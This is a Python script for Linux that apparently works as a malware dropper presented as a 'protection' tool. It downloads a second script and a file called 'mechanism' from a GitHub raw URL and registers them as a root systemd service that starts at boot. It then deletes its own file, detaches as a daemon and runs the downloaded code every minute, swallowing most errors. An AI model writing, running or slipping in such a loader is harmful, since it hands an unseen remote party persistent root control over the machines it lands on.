#!/usr/bin/env python3

# This script is intended for Linux systems that uses systemd and cron

import os
import sys
import time
import site
import subprocess

INTERVAL_SECONDS = 60

def daemonize():
    """
    Detach the process from the terminal and run it as a daemon.
    """
    try:
        # Fork the first time to create a non-session leader
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Parent exits

        # Decouple from the parent environment
        os.chdir("/")
        os.setsid()  # Become session leader
        os.umask(0)

        # Fork again to prevent re-acquisition of a controlling terminal
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Parent exits again

        # Redirect standard file descriptors to /dev/null
        sys.stdout.flush()
        sys.stderr.flush()
        with open("/dev/null", "wb", 0) as devnull:
            os.dup2(devnull.fileno(), sys.stdin.fileno())
            os.dup2(devnull.fileno(), sys.stdout.fileno())
            os.dup2(devnull.fileno(), sys.stderr.fileno())

    except OSError as e:
        sys.stderr.write(f"Daemonization failed: {e}\n")
        sys.exit(1)


# Define URLs for downloading the necessary files
repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection3.py"
requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"

# Define the output file paths
envPath = "/usr/local/bin/protectionEnv"
pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
repoFilePath = "/usr/local/bin/protection.py"
requirementsFilePath = "/usr/local/bin/requirements.txt"
contentFilePath = "/usr/local/bin/mechanism"
serviceFilePath = "/etc/systemd/system/protection.service"

# Function to create a virtual environment and install requests
def create_virtual_environment(envPath):
    try:
        # Create the virtual environment
        subprocess.run([sys.executable, '-m', 'venv', envPath], check=True)
        print(f"[!] Virtual environment created at:\t{envPath}")

        # Determine pip path
        pip_executable = os.path.join(envPath, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(envPath, 'bin', 'pip')

        # Install 'requests' in the virtual environment
        subprocess.run([pip_executable, 'install', 'requests'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print(f"[!] requests installed on virtual environment at:\t{envPath}")

        return True
    except subprocess.CalledProcessError as e:
        print(f"Error creating virtual environment: {e}")
        return False
    except Exception as e:
        print(f"Unexpected error: {e}")
        return False

# Function to install requirements into an existing virtual environment
def setup_python_environment(envPath, requirements_path):
    try:
        if not os.path.exists(requirements_path):
            print("Requirements file not found.")
            return None

        # Determine pip path
        pip_executable = os.path.join(envPath, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(envPath, 'bin', 'pip')

        # Install requirements
        subprocess.run([pip_executable, 'install', '-r', requirements_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        print(f"[!] requirements.txt installed on virtual environment at:\t{envPath}")

        return pip_executable  # Return pip path if needed

    except subprocess.CalledProcessError as e:
        print(f"Error installing dependencies: {e}")
        return None
    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

# Function to activate a virtual environment dynamically
def activate_virtual_environment(envPath):
    bin_path = os.path.join(envPath, 'Scripts') if os.name == 'nt' else os.path.join(envPath, 'bin')
    lib_path = os.path.join(envPath, 'lib', f'python{sys.version_info.major}.{sys.version_info.minor}', 'site-packages')

    if not os.path.exists(bin_path) or not os.path.exists(lib_path):
        print("Invalid virtual environment path.")
        return False

    sys.path.insert(0, lib_path)  # Add site-packages to sys.path
    os.environ['VIRTUAL_ENV'] = envPath
    os.environ['PATH'] = f"{bin_path}{os.pathsep}{os.environ['PATH']}"
    sys.prefix = envPath  # Update sys.prefix to reflect the virtual environment

    return True

# Step 1: Setup virtual environment
#if not os.path.exists(envPath):
create_virtual_environment(envPath)

success = activate_virtual_environment(envPath)

# Function to download a file and save it locally
def download_file(url, file_path):
    try:
        import requests
        response = requests.get(url)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            file.write(response.content)
    except requests.exceptions.RequestException as e:
        print(f"Download failed: {e}")
        pass


# Function to create a systemd service file (Linux only)
def create_service_file(service_file_path, python_path):
    service_content = f"""
[Unit]
Description=Protection Service
After=network.target

[Service]
ExecStart={python_path} /usr/local/bin/protection.py
WorkingDirectory=/usr/local/bin
Environment=PATH={os.path.dirname(python_path)}:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
StandardOutput=journal
StandardError=journal
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
"""
    try:
        with open(service_file_path, 'w') as f:
            f.write(service_content)
    except Exception as e:
        pass

def execute_script():
    """
    Executes the protection.py script using the Python interpreter
    from the virtual environment.
    """
    try:
        print(f"[{time.ctime()}] Executing {repoFilePath}")
        result = subprocess.run([pythonPath, repoFilePath], capture_output=False, text=True)
        print(f"[{time.ctime()}] Execution completed with exit code {result.returncode}")
        if result.stdout:
            print(f"Output:\n{result.stdout}")
            pass
        if result.stderr:
            print(f"Error Output:\n{result.stderr}")
            pass
    except Exception as e:
        print(f"[{time.ctime()}] An error occurred while executing the script: {e}")
        pass



# Function to make script executable
def make_executable(file_path):
    try:
        os.chmod(file_path, 0o755)
    except Exception as e:
        pass

if __name__ == "__main__":

    # Download the files
    download_file(repoUrl, repoFilePath)
    download_file(requirementsUrl, requirementsFilePath)
    download_file(contentUrl, contentFilePath)

    # Ensure environment is active
    if success:
        try:
            pip_path = setup_python_environment(envPath, requirementsFilePath)
        except ImportError as e:
            print(f"ImportError: {e}")

    # Make the main script executable
    make_executable(repoFilePath)

    # Create the service file if on Linux
    if pip_path and os.name != 'nt':  # Skip service creation on Windows
        python_executable = os.path.join(envPath, 'bin', 'python3')
        create_service_file(serviceFilePath, pythonPath)

    try:
        # Reload systemd to recognize the new service
        subprocess.run(['systemctl', 'daemon-reload'], check=True)

        # Enable the service to run at boot
        subprocess.run(['systemctl', 'enable', 'protection.service'], check=True)

        # Start the service immediately
        subprocess.run(['systemctl', 'start', 'protection.service'], check=True)

    except Exception as e:
        pass

    try:
        # Get the full path of the script
        script_path = os.path.abspath(__file__)  

        # Optional: Add delay to ensure the script has finished executing
        time.sleep(1)  

        # Delete the script file
        os.remove(script_path)  
    except Exception as e:
        pass

    # Daemonize the process
    daemonize()

    # Mimic cron
    while True:
        execute_script()
        time.sleep(INTERVAL_SECONDS)

